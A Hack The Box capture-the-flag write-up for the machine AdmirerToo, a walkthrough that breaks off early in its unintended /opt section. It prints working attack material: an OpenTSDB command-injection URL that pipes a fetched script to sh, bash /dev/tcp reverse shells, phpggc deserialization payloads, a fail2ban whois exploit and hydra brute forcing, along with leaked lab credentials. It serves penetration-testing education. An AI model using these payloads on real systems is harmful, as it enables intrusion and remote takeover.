---
title:     "Hack The Box - AdmirerToo"
tags: [linux,hard,adminer,ssrf,OpenTSDB,command injection,opencats,CVE,deserialization,phpggc,fail2ban,whois]
categories: HackTheBox
---
[![000_info_card](/img/admirertoo/000_info_card.png)](/img/admirertoo/000_info_card.png)

AdmirerToo is a hard rated machine on HackTheBox created by [polarbearer](https://www.hackthebox.com/home/users/profile/159204). For the user part we will abuse a SSRF on an adminer installation. This results in access to a vulnerable OpenTSDB installation we are able to abuse to obtain a reverse shell. Finding database credentials for adminer we are able to grab the first flag. Finally we will combine the file write, achieved abusing a deserialization CVE in opencats, with a CVE in the installed fail2ban version to fully compromise the machine.
# User
## Nmap

As usual we start our enumeration with a nmap scan again all ports followed script and version detection scan against the open ones to get an initial overview of the attack surface.

`All ports`
```
$ sudo nmap -p- -n -T4 10.129.162.237
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 09:57 CET
Nmap scan report for 10.129.162.237
Host is up (0.032s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4242/tcp  filtered vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
```

`Script and version`
```
$ sudo nmap -p22,80 -sC -sV -n 10.129.162.237
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 09:58 CET
Nmap scan report for 10.129.162.237
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
```

## Vhost discovery
The filtered ports look interesting but we aren't able to do anything about those yet. Going over to port 80 and doing a directory brute force with gobuster it looks like an ordinary webpage.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.162.237/ -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.162.237/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/01/16 10:03:44 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 330]
/.html                (Status: 403) [Size: 330]
/.html.php            (Status: 403) [Size: 330]
/js                   (Status: 301) [Size: 364] [--> http://10.129.162.237/js/]
/css                  (Status: 301) [Size: 365] [--> http://10.129.162.237/css/]
/index.php            (Status: 200) [Size: 14099]
/.htm                 (Status: 403) [Size: 330]
/.htm.php             (Status: 403) [Size: 330]
/img                  (Status: 301) [Size: 365] [--> http://10.129.162.237/img/]
/.                    (Status: 200) [Size: 14099]
/fonts                (Status: 301) [Size: 367] [--> http://10.129.162.237/fonts/]
/manual               (Status: 301) [Size: 368] [--> http://10.129.162.237/manual/]
...[snip]...
```

Opening a directory in our brower we see that listing is enabled and a hostname is leaked through an email address in the  `mailto` `href`.

[![005_hostname](/img/admirertoo/005_hostname.png)](/img/admirertoo/005_hostname.png)

Bruteforcing for additional vhosts using ffuf we find `db` so we add `db.admirer-gallery.htb` and `admirer-gallery.htb` to our `/etc/hosts` file and continue from there.

```
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.admirer-gallery.htb' -u http://10.129.162.237 -fs 14099

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.162.237
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.admirer-gallery.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 14099
________________________________________________

db                      [Status: 200, Size: 2570, Words: 113, Lines: 63]
```

## SSRF

Going to `db.admirer-gallery.htb` we see the landing page of `adminer` which also includes the current version.

[![010_adminer_home](/img/admirertoo/010_adminer_home.png)](/img/admirertoo/010_adminer_home.png)

This version seems to be vulnerable to [CVE-2021-21311](https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/Adminer%20SSRF%EF%BC%88CVE-2021-21311%EF%BC%89.md) but the login page looks different from the PoC. The reason for this can be found doing another directory brute force with gobuster which finds a `plugins` dir.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://db.admirer-gallery.htb/ -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://db.admirer-gallery.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/01/16 10:12:49 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 338]
/.html                (Status: 403) [Size: 338]
/.html.php            (Status: 403) [Size: 338]
/plugins              (Status: 301) [Size: 385] [--> http://db.admirer-gallery.htb/plugins/]
```

Directory listing is also enabled here and we see that the [one-click-login](https://github.com/giofreitas/one-click-login) plugin is the reason for the different landing page. The plugin allows for quicker authentication by already providing everything needed to connect to a database.

[![015_one_click](/img/admirertoo/015_one_click.png)](/img/admirertoo/015_one_click.png)

To test the SSRF we first point the PoC at localhost port 80 which we know exists.

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost"
serving at port 80
```

We press enter on the only connection on the landing page and intercept the request.

[![020_login](/img/admirertoo/020_login.png)](/img/admirertoo/020_login.png)

Like in the PoC we change the driver to elastic and set the server to our tun0 ip.

[![035_intercept_1](/img/admirertoo/035_intercept_1.png)](/img/admirertoo/035_intercept_1.png)

Forwarding this request we get a hit on the python webserver which get's redirected in turn.

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost"
serving at port 80
10.129.162.237 - - [16/Jan/2022 10:20:13] "GET / HTTP/1.0" 301 -
10.129.162.237 - - [16/Jan/2022 10:20:14] "GET / HTTP/1.0" 301 -
```

Looking at the initial browser page the source of `http://admirer-gallery.htb` got retrieved meaning our SSRF exploit is working and we even get the output of the request.

[![040_ssrf_source_80](/img/admirertoo/040_ssrf_source_80.png)](/img/admirertoo/040_ssrf_source_80.png)

To partially automate the intercepting, changing and filtering of the retrieved content we can use a small python script which makes our life easier. All it does is to perform the request like we did in burp using a session, extracts only the response from the SSRF and decodes the html entities.

`ssrf.py`
```py
#!/usr/bin/env python3
import requests
import html

host = "http://db.admirer-gallery.htb"

proxies = {
        "http": "http://127.0.0.1:8080",
}

data = {
    "auth[driver]":"elastic",
    "auth[server]":"10.10.14.12",
    "auth[username]":"admirer_ro",
    "auth[password]":"1w4nn4b3adm1r3d2!",
    "auth[db]":"admirer",
    "auth[permanent]":"1"
}
s = requests.Session()
r = s.post(host, data=data, proxies=proxies).text
r = r.split("<div class='error'>")[1]
r = r.split('</div>')[0]
print(html.unescape(r))
```

We saw earlier that there were filtered ports. Since we are now requesting from the inside we might be able to retrieve information from them. Checking for the application on port `4242` there seems to be an OpenTSDB installation running.

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost:4242"
serving at port 80
10.129.162.237 - - [16/Jan/2022 10:32:14] "GET / HTTP/1.0" 301 -
10.129.162.237 - - [16/Jan/2022 10:32:14] "GET / HTTP/1.0" 301 -
```

```
$ python3 ssrf.py
<!DOCTYPE html><html><head><meta http-equiv=content-type content="text/html;charset=utf-8"><title>OpenTSDB</title>
<style><!--
body{font-family:arial,sans-serif;margin-left:2em}A.l:link{color:#6f6f6f}A.u:link{color:green}.fwf{font-family:monospace;white-space:pre-wrap}//--></style><script type=text/javascript language=javascript src=s/queryui.nocache.js></script></head>
<body text=#000000 bgcolor=#ffffff><table border=0 cellpadding=2 cellspacing=0 width=100%><tr><td rowspan=3 width=1% nowrap><img src=s/opentsdb_header.jpg><td>&nbsp;</td></tr><tr><td><font color=#507e9b><b></b></td></tr><tr><td>&nbsp;</td></tr></table><div id=queryuimain></div><noscript>You must have JavaScript enabled.</noscript><iframe src=javascript:'' id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0></iframe><table width=100% cellpadding=0 cellspacing=0><tr><td class=subg><img alt="" width=1 height=6></td></tr></table></body></html>
```

### Opentsdb

Referencing the documentation we retrieve the api version in the next request.

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost:4242/api/version"
serving at port 80
10.129.162.237 - - [16/Jan/2022 10:38:05] "GET / HTTP/1.0" 301 -
10.129.162.237 - - [16/Jan/2022 10:38:05] "GET / HTTP/1.0" 301 -
```

```
$ python3 ssrf.py
{"short_revision":"14ab3ef","repo":"/home/hobbes/OFFICIAL/build","host":"clhbase","version":"2.4.0","full_revision":"14ab3ef8a865816cf920aa69f2e019b7261a7847","repo_status":"MINT","user":"hobbes","branch":"master","timestamp":"1545014415"}
```

Looking up the version number we are able to find that it might be vulnerable to [CVE-2020-35476](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35476). Searching further this [github issue](https://github.com/OpenTSDB/opentsdb/issues/2051) mentions how to exploit it. To test it we request the same query as in the issue.

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('curl%2010.10.14.12:8000/shell|sh')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

Next we set up a python webserver to serve a `shell` file containing a reverse shell that connects back to the `ncat` listener we also start.

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`shell`
```bash
#!/bin/bash

bash -c 'bash -i >&/dev/tcp/10.10.14.12/7575 0>&1'
```

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Sending the payload does however not result in a shell but a rather long stack trace. Taking a closer look at it the `sys.cpu.nice` metric mentioned in the issue does not exist in the installation.

```
$ python3 ssrf.py
{"err":"java.lang.RuntimeException: Unexpected exception\n\tat net.opentsdb.
...[snip]...
Caused by: net.opentsdb.uid.NoSuchUniqueName: No such name for 'metrics
': 'sys.cpu.nice
...[snip]...
```

Retrieving the available metrics in the next request by querying the api we see that only `http.stats.web.hits` is available.

```
$ python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost:4242/api/suggest?type=metrics"
serving at port 80
```

```
$ python3 ssrf.py
["http.stats.web.hits"]
```

Changing the metric in the url we try our luck again. Running `ssrf.py` this time we get no immediate response and it hangs.

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('curl%2010.10.14.12:8000/shell|sh')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

```
$ python3 ssrf.py
```

```
$ sudo python2 ssrf_server.py --port 80 --ip 0.0.0.0 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('curl%2010.10.14.12:8000/shell|sh')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
serving at port 80
10.129.162.237 - - [16/Jan/2022 10:50:51] "GET / HTTP/1.0" 301 -
```

Our webserver got a hit for the reverse shell.

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.162.237 - - [16/Jan/2022 10:50:52] "GET /shell HTTP/1.1" 200 -
```

And our listener got a connection back as the user `opentsdb` which we upgrade to a full tty using python.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.162.237.
Ncat: Connection from 10.129.162.237:34454.
bash: cannot set terminal process group (563): Inappropriate ioctl for device
bash: no job control in this shell
opentsdb@admirertoo:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
opentsdb@admirertoo:/$ export TERM=xterm
export TERM=xterm
opentsdb@admirertoo:/$ ^Z
[1]  + 16607 suspended  nc -lnvp 7575
$ stty raw -echo;fg
[1]  + 16607 continued  nc -lnvp 7575

opentsdb@admirertoo:/$
```

## Db credentials

Checking the source code of `server.php` in the earlier discovered plugins directory. We find credentials for another database user next to the ones we already have.

```
opentsdb@admirertoo:/$ cat /var/www/adminer/plugins/data/servers.php
<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];
```

The only other real user next to root is jennifer and trying the password for her over ssh we are able to log into the machine and grab the user flag.

```
ssh jennifer@admirer-gallery.htb
jennifer@admirer-gallery.htb's password:
Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
jennifer@admirertoo:~$ wc -c user.txt
33 user.txt
```

# Root
## Intended

For the root part we will go over the intended method and an alternative method that involved abusing the misconfigured ACL on the `/opt` directory.

### Opencats deserialization
Enumerating the machine as jennifer we see that port 8080 is listening on localhost.

```
jennifer@admirertoo:~$ ss -lnt
State                           Recv-Q                          Send-Q                                                        Local Address:Port                                                    Peer Address:Port
LISTEN                          0                               80                                                                127.0.0.1:3306                                                         0.0.0.0:*
LISTEN                          0                               128                                                               127.0.0.1:8080                                                         0.0.0.0:*
LISTEN                          0                               128                                                                 0.0.0.0:22                                                           0.0.0.0:*
...[snip]...
```

To take a close look at it we forward the port to us using the ssh-console. To enter the console enter `~C` on a new line.

```
jennifer@admirertoo:~$
ssh> -L:8081:127.0.0.1:8080
Forwarding port.
```

Opening the forwarded port in our browser we see the login page of an opencats installation which also leaks the installed version.

[![045_opencats_home](/img/admirertoo/045_opencats_home.png)](/img/admirertoo/045_opencats_home.png)

Checking google for known vulnerabilities in opencats there is this [blogpost](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html) showing a way to exploit insecure deserialization to achive filewrite on the system (CVE-2021-25294 and CVE-2021-25295).

Testing the credentials we found so far against the login page we have success with the combination `jennifer:bQ3u7^AxzcB7qAsxE3`

[![050_logged_in_jennifer](/img/admirertoo/050_logged_in_jennifer.png)](/img/admirertoo/050_logged_in_jennifer.png)

The blogpost performs the exploitation as administrator user. Since we can read the source code of the application we might be able to access the databse and escalate to an administrative user aswell.
Looking at the `config.php` reveals the database name , the user and the db password.

```
jennifer@admirertoo:/opt/opencats$ cat config.php
<?php
...[snip]...

/* License key. */
define('LICENSE_KEY','3163GQ-54ISGW-14E4SHD-ES9ICL-X02DTG-GYRSQ6');

/* legacy root. */
if( !defined('LEGACY_ROOT') )
{
    define('LEGACY_ROOT', '.');
}

/* Database configuration. */
define('DATABASE_USER', 'cats');
define('DATABASE_PASS', 'adm1r3r0fc4ts');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'cats_dev');
...[snip]...
```

Using this credentials we are now able to log into mysql.

```
jennifer@admirertoo:/opt/opencats$ mysql -u cats -D cats_dev -p
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32150
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [cats_dev]>
```

From all the tables the `user` table sounds most interesting in our quest to become administrator.

```

MariaDB [cats_dev]> show tables;
+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
| access_level                         |
| activity                             |
...[snip]...
| user                                 |
...[snip]...
```

Describing the table the two fields involved in authentication seem to be `user_name` and `password`.

```
MariaDB [cats_dev]> describe user;
+---------------------------+--------------+------+-----+---------+----------------+
| Field                     | Type         | Null | Key | Default | Extra          |
+---------------------------+--------------+------+-----+---------+----------------+
| user_id                   | int(11)      | NO   | PRI | NULL    | auto_increment |
| site_id                   | int(11)      | NO   | MUL | 0       |                |
| user_name                 | varchar(64)  | NO   |     |         |                |
| email                     | varchar(128) | YES  |     | NULL    |                |
| password                  | varchar(128) | NO   |     |         |                |
| access_level              | int(11)      | NO   | MUL | 100     |                |
| can_change_password       | int(1)       | NO   |     | 1       |                |
| is_test_user              | int(1)       | NO   |     | 0       |                |
| last_name                 | varchar(40)  | NO   | MUL |         |                |
| first_name                | varchar(40)  | NO   | MUL |         |                |
| is_demo                   | int(1)       | YES  |     | 0       |                |
| categories                | varchar(192) | YES  |     | NULL    |                |
| session_cookie            | varchar(256) | YES  |     | NULL    |                |
| pipeline_entries_per_page | int(8)       | YES  |     | 15      |                |
| column_preferences        | longtext     | YES  |     | NULL    |                |
| force_logout              | int(1)       | YES  |     | 0       |                |
| title                     | varchar(64)  | YES  |     |         |                |
| phone_work                | varchar(64)  | YES  |     |         |                |
| phone_cell                | varchar(64)  | YES  |     |         |                |
| phone_other               | varchar(64)  | YES  |     |         |                |
| address                   | text         | YES  |     | NULL    |                |
| notes                     | text         | YES  |     | NULL    |                |
| company                   | varchar(255) | YES  |     | NULL    |                |
| city                      | varchar(64)  | YES  |     | NULL    |                |
| state                     | varchar(64)  | YES  |     | NULL    |                |
| zip_code                  | varchar(16)  | YES  |     | NULL    |                |
| country                   | varchar(128) | YES  |     | NULL    |                |
| can_see_eeo_info          | int(1)       | YES  |     | 0       |                |
+---------------------------+--------------+------+-----+---------+----------------+
28 rows in set (0.002 sec)
```

Retrieving the values from the table we get the hash for the admin user.

```
MariaDB [cats_dev]> select password, user_name from user;
+----------------------------------+----------------+
| password                         | user_name      |
+----------------------------------+----------------+
| dfa2a420a4e48de6fe481c90e295fe97 | admin          |
| cantlogin                        | cats@rootadmin |
| f59f297aa82171cc860d76c390ce7f3e | jennifer       |
+----------------------------------+----------------+
3 rows in set (0.000 sec)
```

Instead of cracking it we can just update the hashes of the other users to be the same as the hash of jennifer.

```
MariaDB [cats_dev]> update user set password = 'f59f297aa82171cc860d76c390ce7f3e';
Query OK, 2 rows affected (0.000 sec)
Rows matched: 3  Changed: 2  Warnings: 0
```

Now we are able to log into opencats as admin user using jennifer's password `bQ3u7^AxzcB7qAsxE3`

[![055_opencats_admin](/img/admirertoo/055_opencats_admin.png)](/img/admirertoo/055_opencats_admin.png)

To test the filewrite we create a small testfile on our local system which we want to write on the remote end.

```
$ echo 'teststring' > /tmp/testfile
```

To create the payload we use [phpggc](https://github.com/ambionics/phpggc)(exists in kali repo) as mentioned in the blogpost. Since we don't know which user the web application is running as we need to use one generally everyone has write access to. Sometimes users have their own `/tmp` directory so we will use `/dev/shm` in this case to test it.

```
$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/testfile /tmp/testfile
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftestfile%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A11%3A%22teststring%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
```

Following the PoC we intercept a page refresh on opencats and send it to repeater for a request with admin cookies. Then we replace the path and query with the one in the blog and finally the last parameter with the payload generated by `phpggc`.

[![060_burp_deserialization_test](/img/admirertoo/060_burp_deserialization_test.png)](/img/admirertoo/060_burp_deserialization_test.png)

After sending the request in burp and checking inside `/dev/shm` as jenny we see our file got created by the user devel.

```
$ jennifer@admirertoo:/opt/opencats$ ls -la /dev/shm/
total 4
drwxrwxrwt  2 root  root    60 Jan 16 16:51 .
drwxr-xr-x 16 root  root  3080 Jan 16 08:56 ..
-rw-r--r--  1 devel devel   54 Jan 16 16:51 testfile
```

Furthermore the file got written as the dump of a cookie array as the blog describes it.

```
jennifer@admirertoo:/opt/opencats$ cat /dev/shm/testfile
[{"Expires":1,"Discard":false,"Value":"teststring\n"}]
```

Checking for other directories devel can write to, we find an interesting looking one in `/usr/local/etc`.

```
jennifer@admirertoo:/opt/opencats$ find / -type d -group devel -perm /g+w 2> /dev/null
/usr/local/src
/usr/local/etc
```

### Fail2ban
This seems like we might be able to overwrite configuration files for certain applications on the system. Enumerating the system further another interesting find is that a vulnerable version of  `fail2ban` is installed on the system.

```
devel@admirertoo:/etc/fail2ban$ apt-cache policy fail2ban
fail2ban:
  Installed: 0.10.2-2.1
  Candidate: 0.10.2-2.1
  Version table:
 *** 0.10.2-2.1 500
        500 http://deb.debian.org/debian buster/main amd64 Packages
        100 /var/lib/dpkg/status
```

This [github issue](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) mentiones that `fail2ban` can be exploited if we are able to point the `whois` query to a server under our control. Whois can have a configuration file `whois.conf` which lists which server to query for certain domains.
We already have write access in the directory we need the only problem now is the format of the file we are able to write.

Looking at the [source code](https://github.com/rfc1036/whois) of whois, the buffer for a single line is only 512 bytes long and additional whitespaces are being ignored. This means we might be able to close the charset inside `[]` complete our config entry and fill the rest of the line buffer with whitespaces, effectivly removing all the bad characters.

`whois.c`
```c
...[snip]...
#ifdef CONFIG_FILE
const char *match_config_file(const char *s)
{
    FILE *fp;
    char buf[512];
    static const char delim[] = " \t";

    if ((fp = fopen(CONFIG_FILE, "r")) == NULL) {
	if (errno != ENOENT)
	    err_sys("Cannot open " CONFIG_FILE);
	return NULL;
    }
...[snip]...
```

This explains the general approach on how to build the payload.

```
[{"Expires":1,"Discard":false,"Value":"a-zA-Z-0-9-].* 10.10.14.12                                 "}]
|			default					  |       inject record (under our control)                   | default
| 		  	      regex charset 				  | target ip    |      spaces to fill buffer     | array closing of dumped cookie outside of buffer size	
```

Building our payload file with python and phpggc we send it in burp using an autenticated admin session.

```
$ python3 -c 'print("a-zA-Z0-9-].* 10.10.14.12" + " " * 500)' > /tmp/whois.conf
```

```
$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /tmp/whois.conf
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A526%3A%22a-zA-Z0-9-%5D.%2A+10.10.14.12++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
```

[![065_deser_whois_conf](/img/admirertoo/065_deser_whois_conf.png)](/img/admirertoo/065_deser_whois_conf.png)

Checking `/usr/local/etc/whois.conf`  the file got created.

```
jennifer@admirertoo:/opt/opencats$ ls -la /usr/local/etc/
total 12
drwxrwxr-x  2 root  devel 4096 Jan 16 19:15 .
drwxr-xr-x 10 root  root  4096 Jul  7  2021 ..
-rw-r--r--  1 devel devel  569 Jan 16 19:15 whois.conf
jennifer@admirertoo:/opt/opencats$ cat /usr/local/etc/whois.conf
[{"Expires":1,"Discard":false,"Value":"a-zA-Z0-9-].* 10.10.14.12                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    \n"}]
```

Performing a whois query it now reaches out to our machine.

```
jennifer@admirertoo:/opt/opencats$ whois --verbose test.net
Using server 10.10.14.12.
Query string: "test.net"

connect: Connection refused
```

The thing that is left to do now is to create the payload like mentioned in the steps of the github issue and host it on port `43` using nc.

```
$ printf "RCE: next line will execute command\n~! bash -c 'bash -i >&/dev/tcp/10.10.14.12/7575 0>&1'\n" > pwn
```

```
$ sudo nc -nvl -p 43 -c "cat ./pwn" -k
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::43
Ncat: Listening on 0.0.0.0:43
```

We also set up our nc listener to catch the reverse shell if the exploit is successful.

```
nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Next we need a way to trigger `fail2ban`. Taking a look at its config files we see that it is enabled for ssh (`/etc/fail2ban/filter.d/sshd.conf`, meaning we can easily trigger it with a quick hydra brute force.

```
$ hydra -I -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.129.162.237
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-16 20:18:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.129.162.237:22/
```

After a few second whois reached out to our machine, the payload gets sent and we recieve a reverse shell on our other listener.

```
$ sudo nc -nvl -p 43 -c "cat ./pwn" -k
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::43
Ncat: Listening on 0.0.0.0:43
Ncat: Connection from 10.129.162.237.
Ncat: Connection from 10.129.162.237:58970.
```

Now we can grab the root flag.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.162.237.
Ncat: Connection from 10.129.162.237:34998.
bash: cannot set terminal process group (23284): Inappropriate ioctl for device
bash: no job control in this shell
root@admirertoo:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@admirertoo:/# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
```

## Unintended

There was also an unintended method that skipped accessing the database and performing the deserialization exploit.

### Folder permissions
Looking at the ACL of `/opt` every user has write access to it.

```
jennifer@admirertoo:~$ ls -la /opt/
total 16
drwxr-xrwx  4 root root  4096 Jul 21 13:31 .
drwxr-xr-x 18 root root  4096 Jan 11 11:20 ..
